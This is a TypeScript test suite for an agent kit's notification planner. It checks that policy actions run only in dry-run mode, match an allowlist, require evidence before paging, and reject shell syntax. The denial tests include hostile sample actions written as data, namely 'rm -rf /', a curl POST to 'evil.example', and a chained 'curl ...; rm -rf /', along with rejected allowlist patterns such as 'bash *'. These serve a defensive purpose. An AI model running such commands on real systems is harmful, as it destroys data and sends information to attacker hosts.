import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { test } from "node:test";
import {
  parseAllowlist,
  parsePolicy,
  planNotification,
  type NotifyEvent,
} from "../src/notify.js";

const policy = await readFile(new URL("../../templates/notify.policy.example.md", import.meta.url), "utf8");
const allowlistRaw = await readFile(
  new URL("../../templates/notify.allowlist.example.json", import.meta.url),
  "utf8",
);
const rules = parsePolicy(policy);
const allowlist = parseAllowlist(allowlistRaw);

function event(overrides: Partial<NotifyEvent> = {}): NotifyEvent {
  return {
    id: "evt_example",
    type: "needs_review",
    title: "Ready",
    summary: "Evidence is attached.",
    priority: "normal",
    source_task_id: "task_1",
    ...overrides,
  };
}

test("example policy pulls normal items and pushes only evidenced high or escalation", () => {
  const high = planNotification(
    event({ priority: "high", evidence_urls: ["https://ci.example/runs/1001"] }),
    rules,
    allowlist,
  );
  assert.equal(high.mode, "dry-run");
  assert.equal(high.executed, false);
  assert.equal(high.allow, true);
  assert.equal(high.reason, "allowlisted");
  assert.equal(high.matched_rule, "high priority page");
  assert.deepEqual(high.argv, ["curl", "-X", "POST", "https://hooks.example/ship"]);
  assert.equal(high.pattern, "curl -X POST https://hooks.example/*");

  const normal = planNotification(
    event({ priority: "normal", evidence_urls: ["https://ci.example/runs/1"] }),
    rules,
    allowlist,
  );
  assert.equal(normal.executed, false);
  assert.equal(normal.allow, false);
  assert.equal(normal.reason, "no_matching_rule");
  assert.equal(normal.argv, null);

  const blocked = planNotification(event({ type: "blocked", priority: "high", evidence_urls: [] }), rules, allowlist);
  assert.equal(blocked.allow, true);
  assert.equal(blocked.executed, false);
  assert.deepEqual(blocked.argv, ["multica", "issue", "create", "--assignee", "me", "--title", "blocked"]);
  assert.equal(blocked.pattern, "multica issue create --assignee me *");

  const approval = planNotification(event({ type: "needs_approval" }), rules, allowlist);
  assert.equal(approval.allow, true);
  assert.deepEqual(approval.argv, [
    "multica",
    "issue",
    "create",
    "--assignee",
    "me",
    "--title",
    "needs-approval",
  ]);
});

test("high priority without evidence is not paged, even if a loose rule would match", () => {
  const loose = parsePolicy(`## Rule: page anyway

when.priority: high
when.type: needs_review
action: curl -X POST https://hooks.example/ship
`);
  const refused = planNotification(event({ priority: "high", evidence_urls: [] }), loose, allowlist);
  assert.equal(refused.allow, false);
  assert.equal(refused.executed, false);
  assert.equal(refused.reason, "missing_evidence");
  assert.equal(refused.argv, null);

  const fromExample = planNotification(event({ priority: "high", evidence_urls: [] }), rules, allowlist);
  assert.equal(fromExample.allow, false);
  assert.equal(fromExample.reason, "no_matching_rule");
});

test("captain --action still has to match the allowlist and the evidence gate", () => {
  const planned = planNotification(
    event({ type: "needs_approval" }),
    rules,
    allowlist,
    "multica issue create --assignee me --title from-captain",
  );
  assert.equal(planned.matched_rule, "captain action");
  assert.equal(planned.allow, true);
  assert.equal(planned.executed, false);

  const pagedWithoutProof = planNotification(
    event({ priority: "high", type: "needs_review", evidence_urls: [] }),
    rules,
    allowlist,
    "curl -X POST https://hooks.example/ship",
  );
  assert.equal(pagedWithoutProof.allow, false);
  assert.equal(pagedWithoutProof.reason, "missing_evidence");

  const tooBroad = planNotification(event({ type: "blocked" }), rules, allowlist, "multica inbox push");
  assert.equal(tooBroad.allow, false);
  assert.equal(tooBroad.reason, "not_allowlisted");
});

test("dry-run denies commands outside the example allowlist", () => {
  const hostile = parsePolicy(`## Rule: no

when.type: needs_review
action: rm -rf /
`);
  const denied = planNotification(event(), hostile, allowlist);
  assert.equal(denied.allow, false);
  assert.equal(denied.executed, false);
  assert.equal(denied.reason, "not_allowlisted");

  const wrongHost = parsePolicy(`## Rule: no

when.type: needs_review
action: curl -X POST https://evil.example/hook
`);
  const offHost = planNotification(event(), wrongHost, allowlist);
  assert.equal(offHost.allow, false);
  assert.equal(offHost.reason, "not_allowlisted");

  const pipeline = parsePolicy(`## Rule: no

when.type: needs_review
action: curl -X POST https://hooks.example/ship; rm -rf /
`);
  const shelled = planNotification(event(), pipeline, allowlist);
  assert.equal(shelled.allow, false);
  assert.equal(shelled.reason, "shell_metacharacter");
  assert.equal(shelled.argv, null);
});

test("the example allowlist does not accept a broad multica command", () => {
  const rule = parsePolicy(`## Rule: short

when.type: blocked
action: multica inbox push
`);
  const plan = planNotification(event({ type: "blocked" }), rule, allowlist);
  assert.equal(plan.allow, false);
  assert.equal(plan.reason, "not_allowlisted");

  const exactEnough = parsePolicy(`## Rule: issue

when.type: blocked
action: multica issue create --assignee me
`);
  const short = planNotification(event({ type: "blocked" }), exactEnough, allowlist);
  assert.equal(short.allow, false);
  assert.equal(short.reason, "not_allowlisted");
});

test("unrelated events match no rule", () => {
  const plan = planNotification(event({ type: "proposal_ready" }), rules, allowlist);
  assert.equal(plan.allow, false);
  assert.equal(plan.reason, "no_matching_rule");
  assert.equal(plan.executed, false);
});

test("allowlist rejects shells, bare wildcards, and shell syntax", () => {
  assert.throws(() => parseAllowlist(JSON.stringify({ patterns: ["*"] })), /literal program name/);
  assert.throws(() => parseAllowlist(JSON.stringify({ patterns: ["bash *"] })), /shell or sudo/);
  assert.throws(() => parseAllowlist(JSON.stringify({ patterns: ["curl; rm *"] })), /shell syntax/);
  assert.throws(() => parseAllowlist(JSON.stringify({ patterns: ["python *"] })), /interpreter/);
});

test("only notify run spawns, and it does so without a shell", async () => {
  for (const name of ["notify.ts", "inbox.ts", "cli.ts"]) {
    const source = await readFile(new URL(`../src/${name}`, import.meta.url), "utf8");
    assert.doesNotMatch(source, /child_process/);
    assert.doesNotMatch(source, /\b(spawn|execFile|execSync|spawnSync)\s*\(/);
  }
  const runner = await readFile(new URL("../src/run.ts", import.meta.url), "utf8");
  assert.match(runner, /shell:\s*false/);
  assert.doesNotMatch(runner, /shell:\s*true/);
});

test("event schema is JSON and describes needs_review", async () => {
  const schema = JSON.parse(await readFile(new URL("../../events/schema.json", import.meta.url), "utf8"));
  assert.equal(schema.title, "agent-ship-kit event");
  assert.ok(schema.properties.priority.enum.includes("high"));
  assert.ok(schema.properties.priority.enum.includes("normal"));
  assert.deepEqual(schema.properties.links.properties && Object.keys(schema.properties.links.properties).sort(), [
    "issue",
    "path",
    "pr",
  ]);
  const needsReview = schema.allOf.find(
    (entry: { then?: { required?: string[] } }) => entry.then?.required?.includes("evidence_urls"),
  );
  assert.ok(needsReview);
  assert.equal(schema.examples[0].type, "needs_review");
  assert.ok(schema.properties.type.enum.includes("blocked"));
  assert.ok(schema.properties.type.enum.includes("needs_approval"));
  const decided = schema.allOf.find(
    (entry: { then?: { required?: string[] } }) => entry.then?.required?.includes("subject_id"),
  );
  assert.ok(decided);
});
